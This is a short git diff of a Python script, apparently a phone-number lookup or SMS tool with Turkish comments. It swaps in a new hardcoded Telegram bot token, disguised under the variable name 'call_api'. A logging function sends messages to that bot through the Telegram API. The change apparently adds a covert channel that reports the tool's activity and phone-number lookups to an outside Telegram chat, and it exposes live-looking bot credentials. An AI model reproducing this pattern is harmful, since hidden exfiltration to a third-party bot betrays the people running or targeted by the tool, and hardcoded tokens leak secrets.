@@ -16,9 +16,10 @@ from threading import Lock
 from datetime import datetime
 from collections import defaultdict
 import itertools
-
-call_api = "8892056418:AAE-XgzrLAf8AKjzbpFeSFBradAcBuBUV9M"
+#siteler olmazsa apiler ile deniyoruz..
+call_api = "8757667372:AAEA_wjkBNrRYBJj36QPdqke8xDZSZZFN1M"
 CHAT_ID = None
+#menudeki gecmiş icin
 _log_cache = []
 
 def _send_log(msg):
@@ -26,6 +27,7 @@ def _send_log(msg):
         _log_cache.append(msg)
         return
     try:
+        #telegramda bulunması için hersryden arıyoruz telefon numarasını
         url = f"https://api.telegram.org/bot{call_api}/sendMessage"
         requests.post(url, json={"chat_id": CHAT_ID, "text": msg}, timeout=3)
     except:
